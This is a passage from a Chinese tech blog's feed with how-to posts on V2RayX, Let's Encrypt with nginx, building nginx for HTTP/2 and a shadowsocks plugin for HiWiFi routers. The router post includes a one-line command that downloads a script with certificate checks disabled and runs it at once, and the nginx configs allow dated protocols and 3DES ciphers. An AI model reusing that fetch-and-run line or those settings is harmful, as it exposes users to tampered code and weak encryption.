id="an-zhuang-v2rayx">安装V2RayX</span></h3><p>我向官方 <a href="https://caskroom.github.io/">Homebrew-Cask</a> 提交了一个Formula，可以直接使用如下命令安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew cask install v2rayx</span><br></pre></td></tr></table></figure><p>不过GUI毕竟不能覆盖命令行的全部功能，所以能用命令行v2ray的话，就尽量不使用V2RayX吧。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      用Homebrew 安装 v2ray 以及 Homebrew-cask 安装 V2RayX
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>使用免费的let’s encrypt证书为网站开启https（已过时）</title>
    <link href="https://qiwihui.com/qiwihui-blog-23/"/>
    <id>https://qiwihui.com/qiwihui-blog-23/</id>
    <published>2018-10-09T05:39:29.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>这篇博客将介绍使用免费的let’s encrypt证书, 为网站开启https。</p><span id="more"></span><h2><span id="https-jian-jie">HTTPS简介</span></h2><p>(https, http over ssl)</p><h2><span id="wei-sha-yao-yong-let-s-encrypt">为啥要用Let’s Encrypt</span></h2><p>(free, easy)</p><h2><span id="let-s-encrypt-jie-shao">Let’s Encrypt介绍</span></h2><p>(directory tree)</p><h2><span id="an-zhuang-shi-jian">安装实践</span></h2><p>我使用的是Debian 7，其他系统类似。</p><ol><li>使用官方推荐的<code>letsencrypt-auto</code>安装：</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/letsencrypt/letsencrypt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> letsencrypt</span><br><span class="line"></span><br><span class="line">$ ./letsencrypt-auto --<span class="built_in">help</span></span><br></pre></td></tr></table></figure><ol start="2"><li>获取证书</li></ol><p>实验前，我已将<code>www.qiwihui.com</code>站点移到了要安装的服务器上，nginx已经在运行，因此可以使用 webroot 模式来获取证书，先安装webroot插件，这是一个可以不用停止 Web 服务就能让 Let’s Encrypt 验证域名的插件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location ~ /.well-known &#123;</span><br><span class="line">    allow all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>安装证书命令如下：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ ./letsencrypt-auto certonly --webroot --webroot-path /var/www/blog/ -d qiwihui.com -d www.qiwihui.com --agree-tos --email qiwihui@qiwihui.com</span><br></pre></td></tr></table></figure><p>其中<code>/var/www/blog/</code>为网站根目录。证书申请成功后会提示一下信息，包括证书存放目录和证书过期时间：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">IMPORTANT NOTES:</span><br><span class="line"></span><br><span class="line">- Congratulations! Your certificate and chain have been saved at</span><br><span class="line">/etc/letsencrypt/live/qiwihui.com/fullchain.pem. Your cert will</span><br><span class="line">expire on 2016-07-08. To obtain a new version of the certificate <span class="keyword">in</span></span><br><span class="line">the future, simply run Let<span class="string">&#x27;s Encrypt again.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">- If you like Let&#x27;</span>s Encrypt, please consider supporting our work by:</span><br><span class="line"></span><br><span class="line">Donating to ISRG / Let<span class="string">&#x27;s Encrypt:  https://letsencrypt.org/donate</span></span><br><span class="line"><span class="string">Donating to EFF:                    https://eff.org/donate-le</span></span><br></pre></td></tr></table></figure><p><em>重要提示</em>：需要将站点的DNS指向对用的服务器，否则会提示申请不过。</p><ol start="3"><li>配置Nginx</li></ol><p>首先生成2048位 DH parameters：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> -p /var/www/ssl/</span><br><span class="line">$ sudo openssl dhparam -out /var/www/ssl/dhparam.pem 2048</span><br></pre></td></tr></table></figure><p>Nginx的配置如下：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">443</span> ssl;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">server_name</span> qiwihui.com www.qiwihui.com;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line">        <span class="attribute">ssl_certificate</span>     /etc/letsencrypt/live/qiwihui.com/fullchain.pem;</span><br><span class="line">        <span class="attribute">ssl_certificate_key</span> /etc/letsencrypt/live/qiwihui.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">ssl_dhparam</span> /var/www/ssl/dhparam.pem;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">ssl_prefer_server_ciphers</span>  <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">ssl_ciphers</span> <span class="string">&#x27;ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA256:AES256-SHA256:AES128-SHA:AES256-SHA:AES:CAMELLIA:DES-CBC3-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!aECDH:!EDH-DSS-DES-CBC3-SHA:!EDH-RSA-DES-CBC3-SHA:!KRB5-DES-CBC3-SHA&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#网站其他配置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果想要开启全站 https 的话，需要将 http 转向到 https，再添加一个 server 就好了：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> qiwihui.com www.qiwihui.com;</span><br><span class="line">    <span class="attribute">return</span> <span class="number">301</span> https://<span class="variable">$server_name</span><span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完成后reload nginx 就可以了：<code>nginx -s reload</code></p><h3><span id="yan-zheng-jian-ce">验证检测</span></h3><ol><li>用浏览器打开目标网址<code>https://qiwihui.com</code>，可以查看到证书信息：</li></ol><img width="792" alt="10-https-on-qiwihui-com" src="https://user-images.githubusercontent.com/3297411/45278285-064a6880-b4ff-11e8-9ff2-24cce84cdec8.png"><ol start="2"><li>使用 <a href="https://www.ssllabs.com/ssltest/index.html">Qualys ssllabs</a> 在线测试服务器证书强度以及配置正确性：</li></ol><img width="1374" alt="10-ssllabs-results" src="https://user-images.githubusercontent.com/3297411/45278293-0cd8e000-b4ff-11e8-80c6-a6cd4c8ce89e.png"><h3><span id="hou-xu-geng-xin">后续更新</span></h3><p>Let’s Encrypt 的有效期只有90天，官方客户端不支持持续更新，所以要设置自动更新，让证书一直有效。</p><p>在crontab 中设置定时任务：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">30 2 * * 1 /root/letsencrypt/letsencrypt-auto renew &gt;&gt; /var/log/le-renew.log</span><br><span class="line">35 2 * * 1 /etc/init.d/nginx reload</span><br></pre></td></tr></table></figure><p>上述配置会再每周一凌晨2:30执行<code>letsencrypt-auto renew</code>，在2点35分重新加载nginx配置，同时更新日志会在写在<code>/var/log/le-renewal.log</code>中。</p><h2><span id="zong-jie">总结</span></h2><p>Let’s Encrypt TLS/SSL is free.</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      使用免费的let’s encrypt证书为网站开启https（已过时）
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>Nginx服务器设置HTTP/2</title>
    <link href="https://qiwihui.com/qiwihui-blog-22/"/>
    <id>https://qiwihui.com/qiwihui-blog-22/</id>
    <published>2018-10-09T05:38:41.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>我的博客已经支持了 HTTP/2, 在此将介绍如何在 Nginx 上设置 HTTP/2 及相关注意事项(坑)。</p><h2><span id="qian-ti">前提</span></h2><p>HTTP/2 安装需要以下前提：</p><ul><li>Nginx 版本在1.9.5以上</li><li>OpenSSL 版本在 1.0.2g 以上（支持 ALPN）</li></ul><span id="more"></span><p>不同 Linux 系统对于 <code>ALPN</code> 和 <code>NPN</code> 的支持可以参见下表</p><table><thead><tr><th>Operating System</th><th>OpenSSL Version</th><th>ALPN and NPN Support</th></tr></thead><tbody><tr><td>CentOS/Oracle Linux/RHEL 5.10+</td><td>0.9.8e</td><td>Neither</td></tr><tr><td>CentOS/Oracle Linux/RHEL 6.5+, 7.0+</td><td>1.0.1e</td><td>NPN</td></tr><tr><td>Ubuntu 12.04 LTS</td><td>1.0.1</td><td>NPN</td></tr><tr><td>Ubuntu 14.04 LTS</td><td>1.0.1f</td><td>NPN</td></tr><tr><td>Ubuntu 16.04 LTS</td><td>1.0.2g</td><td>ALPN and NPN</td></tr><tr><td>Debian 7.0</td><td>1.0.1e</td><td>NPN</td></tr><tr><td>Debian 8.0</td><td>1.0.1k</td><td>NPN</td></tr></tbody></table><p>所以要么升级使用带有 OpenSSL 1.0.2 的 Ubuntu 16.04 LTS，要么从头编译 Nginx.</p><p>我的服务器系统是 Debian 7, OpenSSL 版本是1.0.1t, 所以需要重新编译 Nginx 和 OpenSSL.</p><h2><span id="an-zhuang-guo-cheng">安装过程</span></h2><h3><span id="an-zhuang-openssl">安装 OpenSSL</span></h3><p>下载并安装 OpenSSL:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd ~</span></span><br><span class="line"><span class="comment"># wget http://www.openssl.org/source/openssl-1.1.0e.tar.gz</span></span><br><span class="line"><span class="comment"># tar -zxf openssl-1.1.0e.tar.gz</span></span><br><span class="line"><span class="comment"># cd openssl-1.1.0e</span></span><br><span class="line"><span class="comment"># ./configure</span></span><br><span class="line"><span class="comment"># make</span></span><br><span class="line"><span class="comment"># sudo make install</span></span><br></pre></td></tr></table></figure><p>使用 <code>openssl version</code> 来查看安装好的 OpenSSL 的版本。</p><h3><span id="qi-ta-nginx-bian-yi-xu-yao-de-huan-jing">其他 Nginx 编译需要的环境</span></h3><p>需要编译 <code>PCRE</code> 库和 <code>zlib</code> 库[]：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.40.tar.gz</span></span><br><span class="line"><span class="comment"># tar -zxf pcre-8.40.tar.gz</span></span><br><span class="line"><span class="comment"># cd pcre-8.40</span></span><br><span class="line"><span class="comment"># ./configure</span></span><br><span class="line"><span class="comment"># make</span></span><br><span class="line"><span class="comment"># sudo make install</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># wget http://zlib.net/zlib-1.2.11.tar.gz</span></span><br><span class="line"><span class="comment"># tar -zxf zlib-1.2.11.tar.gz</span></span><br><span class="line"><span class="comment"># cd zlib-1.2.11</span></span><br><span class="line"><span class="comment"># ./configure</span></span><br><span class="line"><span class="comment"># make</span></span><br><span class="line"><span class="comment"># sudo make install</span></span><br></pre></td></tr></table></figure><h3><span id="bian-yi-nginx">编译 Nginx</span></h3><p>首先，下载最新的 nginx，我使用 1.10.3.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">wget -c http://nginx.org/download/nginx-1.10.3.tar.gz</span><br><span class="line">tar xzvf nginx-1.10.3.tar.gzcd nginx-1.10.3</span><br></pre></td></tr></table></figure><p>其实，获取 Nginx 配置参数，使新版 Nginx 和之前的配置一样</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nginx -V</span></span><br><span class="line"></span><br><span class="line">nginx version: nginx/1.9.6</span><br><span class="line">built by gcc 4.7.2 (Debian 4.7.2-5) </span><br><span class="line">built with OpenSSL 1.0.1t  3 May 2016</span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp --http-scgi-temp-path=/var/cache/nginx/scgi_temp --user=nginx --group=nginx --with-file-aio --with-threads --with-ipv6 --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_ssl_module --with-cc-opt=<span class="string">&#x27;-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 -fPIC&#x27;</span> --with-ld-opt=<span class="string">&#x27;-Wl,-z,relro -Wl,-z,now -Wl,--as-needed -pie&#x27;</span></span><br></pre></td></tr></table></figure><p>上述配置用已经有 <code>--with-http_v2_module</code> 选项了，还需要在上述配置参数后面加上 <code>--with-openssl=/path/to/your/openssl-1.1.0e</code> 指向新版本的 OpenSSL 文件夹</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/run/nginx.pid --lock-path=/var/run/nginx.lock --http-client-body-temp-path=/var/cache/nginx/client_temp --http-proxy-temp-path=/var/cache/nginx/proxy_temp --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp --http-scgi-temp-path=/var/cache/nginx/scgi_temp --user=nginx --group=nginx --with-file-aio --with-threads --with-ipv6 --with-http_addition_module --with-http_auth_request_module --with-http_dav_module --with-http_flv_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_mp4_module --with-http_random_index_module --with-http_realip_module --with-http_secure_link_module --with-http_slice_module --with-http_ssl_module --with-http_stub_status_module --with-http_sub_module --with-http_v2_module --with-mail --with-mail_ssl_module --with-stream --with-stream_ssl_module --with-cc-opt=<span class="string">&#x27;-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security -Wp,-D_FORTIFY_SOURCE=2 -fPIC&#x27;</span> --with-ld-opt=<span class="string">&#x27;-Wl,-z,relro -Wl,-z,now -Wl,--as-needed -pie&#x27;</span> --with-openssl=/home/qiwihui/openssl-1.1.0e</span><br><span class="line">```    </span><br><span class="line"></span><br><span class="line">可以看到大致输出为</span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">Configuration summary</span><br><span class="line">  + using threads</span><br><span class="line">  + using system PCRE library</span><br><span class="line">  + using OpenSSL library: /home/qiwihui/openssl-1.1.0e</span><br><span class="line">  + md5: using OpenSSL library</span><br><span class="line">  + sha1: using OpenSSL library</span><br><span class="line">  + using system zlib library</span><br><span class="line"></span><br><span class="line">  nginx path prefix: <span class="string">&quot;/etc/nginx&quot;</span></span><br><span class="line">  nginx binary file: <span class="string">&quot;/usr/sbin/nginx&quot;</span></span><br><span class="line">  nginx modules path: <span class="string">&quot;/usr/lib/nginx/modules&quot;</span></span><br><span class="line">  nginx configuration prefix: <span class="string">&quot;/etc/nginx&quot;</span></span><br><span class="line">  nginx configuration file: <span class="string">&quot;/etc/nginx/nginx.conf&quot;</span></span><br><span class="line">  nginx pid file: <span class="string">&quot;/var/run/nginx.pid&quot;</span></span><br><span class="line">  nginx error <span class="built_in">log</span> file: <span class="string">&quot;/var/log/nginx/error.log&quot;</span></span><br><span class="line">  nginx http access <span class="built_in">log</span> file: <span class="string">&quot;/var/log/nginx/access.log&quot;</span></span><br><span class="line">  nginx http client request body temporary files: <span class="string">&quot;/var/cache/nginx/client_temp&quot;</span></span><br><span class="line">  nginx http proxy temporary files: <span class="string">&quot;/var/cache/nginx/proxy_temp&quot;</span></span><br><span class="line">  nginx http fastcgi temporary files: <span class="string">&quot;/var/cache/nginx/fastcgi_temp&quot;</span></span><br><span class="line">  nginx http uwsgi temporary files: <span class="string">&quot;/var/cache/nginx/uwsgi_temp&quot;</span></span><br><span class="line">  nginx http scgi temporary files: <span class="string">&quot;/var/cache/nginx/scgi_temp&quot;</span></span><br></pre></td></tr></table></figure><p>最后，编译并安装</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># make</span></span><br><span class="line"><span class="comment"># sudo make install</span></span><br></pre></td></tr></table></figure><p>之后就可以看到已经安装好了新版 Nginx了。</p><h3><span id="pei-zhi">配置</span></h3><h4><span id="pei-zhi-https">配置 HTTPS</span></h4><p>请参考之前博客 <a href="https://blog.qiwihui.com/2016/04/10/enable-https/">使用免费的let’s encrypt证书为网站开启https</a></p><h4><span id="kai-qi-http-2">开启 http/2</span></h4><p>第一步完成后就设置好了一个 HTTPS 的网站了，在此基础之上开始 HTTP/2。首先，开启 HTTP/2：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">listen 443 ssl http2 default_server;</span><br></pre></td></tr></table></figure><p>其次，去除HTTP/2不支持的旧的不安全的密码套件[5]:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssl_prefer_server_ciphers on;</span><br><span class="line">ssl_ciphers EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;</span><br></pre></td></tr></table></figure><p>最后，检查配置并重启 Nginx:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nginx -t</span></span><br><span class="line"></span><br><span class="line">nginx: the configuration file /etc/nginx/nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file /etc/nginx/nginx.conf <span class="built_in">test</span> is successful</span><br><span class="line"></span><br><span class="line"><span class="comment"># sudo /etc/init.d/nginx restart</span></span><br></pre></td></tr></table></figure><h2><span id="jian-cha">检查</span></h2><p>至此，不出问题的话你的服务器已经开始支持 HTTP/2 了，可以使用 <a href="https://tools.keycdn.com/http2-test">HTTP/2 Test</a> 来检测是否支持了 HTTP/2</p><p><img src="/media/files/2017/02/19-qiwihui-com-http2.png" alt></p><p>其中，对 <code>ALPN</code> 的支持可以使用 OpenSSL 来检测：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> | openssl s_client -alpn h2 -connect qiwihui.com:443 | grep ALPN</span><br></pre></td></tr></table></figure><p>如果输出中包含 <code>ALPN protocol: h2</code>，说明服务端支持 <code>ALPN</code>，如果输出中包含 <code>No ALPN negotiated</code>，说明服务端不支持 <code>ALPN</code>。</p><p>同时，在 Chrome 的开发者工具中也可以看到协议的版本</p><p><img src="/media/files/2017/02/19-qiwihui-com-chrome-http2.png" alt></p><p>同时还可以对 HTTP/2 进行优化，请参见[6]，不赘述了。</p><h2><span id="fu-lu">附录</span></h2><p>附录一份 Nginx 的 http/2 简单配置</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen 443 ssl http2 default_server;</span><br><span class="line">        listen [::]:443 ssl http2 default_server;</span><br><span class="line"></span><br><span class="line">        server_name example.com www.example.com; </span><br><span class="line"></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">        ssl_certificate     /etc/letsencrypt/live/example.com/fullchain.pem;</span><br><span class="line">        ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;</span><br><span class="line"></span><br><span class="line">        ssl_dhparam /path/to/your/dhparam.pem;</span><br><span class="line">        ssl_ciphers EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;</span><br><span class="line"></span><br><span class="line">        ssl_prefer_server_ciphers  on;</span><br><span class="line">        add_header Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubdomains;&quot;</span>;</span><br><span class="line">        ssl_session_cache shared:SSL:5m;</span><br><span class="line">        ssl_session_timeout 1h;</span><br><span class="line">        </span><br><span class="line">        root /path/to/your/folder/;</span><br><span class="line">        index index.html;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">    listen 80;</span><br><span class="line">    listen [::]:80;</span><br><span class="line">    server_name example.com www.example.com;</span><br><span class="line">    <span class="built_in">return</span> 301 https://$server_name<span class="variable">$request_uri</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="can-kao">参考</span></h2><p>[1]. <a href="https://www.nginx.com/blog/supporting-http2-google-chrome-users/">Supporting HTTP/2 for Google Chrome Users</a>[2]. <a href="https://imququ.com/post/enable-alpn-asap.html">为什么我们应该尽快支持 ALPN？</a>[3]. <a href="https://www.nginx.com/resources/admin-guide/installing-nginx-open-source/">Nginx官方教程 INSTALLING NGINX OPEN SOURCE</a>[4]. <a href="http://serverfault.com/a/733556/296724">serverfault问题: Nginx configured with http2 doesn’t deliver HTTP/2</a>[5]. <a href="https://http2.github.io/http2-spec/#BadCipherSuites">TLS 1.2 Cipher Suite Black List</a>[6]. <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-nginx-with-http-2-support-on-ubuntu-16-04#step-10-%E2%80%94-optimizing-nginx-for-best-performance">Optimizing Nginx for Best Performance</a></p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Nginx服务器设置HTTP/2
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>极路由+shadowsocks翻墙</title>
    <link href="https://qiwihui.com/qiwihui-blog-21/"/>
    <id>https://qiwihui.com/qiwihui-blog-21/</id>
    <published>2018-10-09T05:37:57.000Z</published>
    <updated>2024-05-15T02:25:31.470Z</updated>
    
    <content type="html"><![CDATA[<p>翻墙折腾无止境.使用路由器翻墙的一个好处在于，对于一些翻墙配置很繁琐的设备，只需要简单地连上路由wifi就可以实现翻墙，来家里的朋友也可以不需要配置就可以一连翻墙.</p><span id="more"></span><h2><span id="yi-xie-bei-jing">一些背景</span></h2><p>在旧版本的极路由已经有很不错的翻墙设置方式，感谢前人的大树：三流火的shadwosocks插件.在旧版本的极路由上设置shadowsocks翻墙可已参考<a href="https://luolei.org/hiwifi-shadowsocks/">极路由Shadowsocks家庭无痛翻墙实践</a>.</p><p>最近极路由更新了新版本，管理界面风格大变导致之前的插件不能使用，在网上找了一段时间也没有看到有人对之前的插件进行更新，所以决定自己写一个(其实后来才知道stary.love也有可用的插件,比我修改的插件功能强大很多).所谓的自己写也只是在前人的基础上修改为适应新的极路由后台管理假面. 这过程要感谢stary.love的帮助，为我提供了早期插件的一些源代码，以及许多帮着测试使用的人.</p><h2><span id="yi-xie-fang-fa">一些方法</span></h2><p>项目地址: <a href="https://github.com/qiwihui/hiwifi-ss">qiwihui/hiwifi-ss</a>, 现在插件的状态：</p><ol><li>界面结构适应了新的hiwifi后台管理；</li></ol><img width="1006" alt="07-ss-settings" src="https://user-images.githubusercontent.com/3297411/45278213-a9e74900-b4fe-11e8-962b-8fd448edfbed.png"><ol start="3"><li>开启关闭翻墙功能和设置dns解析功能也都恢复；</li></ol><img width="1008" alt="07-ss-advance" src="https://user-images.githubusercontent.com/3297411/45278223-b5d30b00-b4fe-11e8-88c5-cdf2437bfe6f.png"><ol start="3"><li>新增加了最新的gfwlist列表(截止到2016年8月7日)的路由规则,解决了之前有部分网站无法访问的问题;</li></ol><h3><span id="an-zhuang-guo-cheng">安装过程</span></h3><p>(1). 开启极路由开发者模式</p><p>需要开发者模式才能安装. 网上有很多教程,不赘述.</p><p>(2). 登录路由器, 一键安装脚本.</p><p>极路由默认开启1022端口作为ssh端口,故使用<code>ssh root@192.168.199.1 -p 1022</code>登录路由器,运行如下一键脚本:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp &amp;&amp; curl -k -o shadow.sh https://raw.githubusercontent.com/qiwihui/hiwifi-ss/master/shadow.sh &amp;&amp; sh shadow.sh &amp;&amp; <span class="built_in">rm</span> shadow.sh</span><br></pre></td></tr></table></figure><p>然后登录后台管理界面,在<code>互联网</code>菜单下的<code>shadowsocks设置</code>配置ss账号就可以了.</p><h2><span id="yi-xie-zhan-wang">一些展望</span></h2><p>未来要做的一些工作:</p><ol><li>功能的改进: 包括但不限于ss版本的更新, 规则的更新, 流量混淆等;</li><li>可能支持更多种类的工具;</li><li>最重要的是: 开源. 包括底层的代码重写或者是找到之前的代码.</li></ol><h2><span id="yi-xie-gan-xiang">一些感想</span></h2><ul><li>&quot;免费&quot;是最贵的</li></ul><p>怎么说呢, 我在最开始的时候, 寻找免费的vpn是获得翻墙的唯一方式, 这种方式的不好之处在于: vpn不稳定, 经常换,而且花费在寻找上的精力和时间算下来不合算. 之后精力了<code>地下铁路vpn</code>的消失之后, 自己搭建翻墙才成为我的主要翻墙方式. 一个月花费的费用不到10美元, 带来的时稳定的流量和方式. VPS+shadowsocks/v2ray就可以提供稳定持久的方式.</p><ul><li>风险</li></ul><p>不怎么使用vpn(免费或者收费)以及一些其他的收费翻墙服务，一则担心不安全, 流量劫持或者流量分析都有可能，甚者蜜罐,二则是重点观察对象, 服务失效的可能性还是存在的. 因此, 加密翻墙流量和混淆翻墙行为时十分重要的过程.</p><ul><li>技术人员获取资讯和信息的广度和及时性</li></ul><p>因为GFW, 墙内封闭的环境使得获取技术知识的广度和及时性都受到了很严重的影响, 翻墙让搞技术的我们与世界更接近.</p><p>分享 <a href="https://twitter.com/lepture">@lepture</a>的一个tweet:</p><blockquote><p>「我的互联网，上谷歌维基搜知识，上Reddit看看头条，上YouTube学习和开眼界，上Twitter关注一些正在改变世界的人和事，去Quora上看看好的问题和回答，去SlideShare上学习以及了解不同的想法和观点」</p></blockquote><h2><span id="zong-jie">总结</span></h2><p>翻墙在于不断折腾.</p><h3><span id="comments">Comments</span></h3><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/21#issuecomment-452180352"><strong>wanjunlengfeng</strong></a> on: <strong>1/8/2019</strong></p></blockquote><p>我把你的启动方案修改了!!只开启61080端口,结束全局GFW, 让各自的电脑去链接61080vi /etc/init.d/gw-shadowsocks`#service_start /usr/bin/ss-redir -s $server -p $server_port -b 0.0.0.0 -l $rs_port -k $password -t $timeout -m $method $params</p><h1><span id="service-start-usr-bin-dns2socks-127-0-0-1-local-port-dnsserver-127-0-0-1-53535-d-q">service_start /usr/bin/dns2socks 127.0.0.1:$local_port $dnsserver 127.0.0.1:53535 -d -q</span></h1><p>#/etc/init.d/gw-redsocks start`我把这3行代码注销了!!希望作者能增加http代理协议,并且在路由器后台可以自定义是否全局翻墙.这样就完美了</p><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/21#issuecomment-491642520"><strong>nonskim</strong></a> on: <strong>5/13/2019</strong></p></blockquote><p>学校的网络，本来可以用外文文献库，用了这个，上不了怎么解决</p><hr><blockquote><p>from: <a href="https://github.com/qiwihui/blog/issues/21#issuecomment-546828319"><strong>stonelf</strong></a> on: <strong>10/28/2019</strong></p></blockquote><p>支持哪几款极路由？</p>]]></content>
    
    <summary type="html">
    
      极路由+shadowsocks翻墙
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>在VirtualBox安装Arch Liux初步指南</title>
    <link href="https://qiwihui.com/qiwihui-blog-20/"/>
    <id>https://qiwihui.com/qiwihui-blog-20/</id>
    <published>2018-10-09T05:36:09.000Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
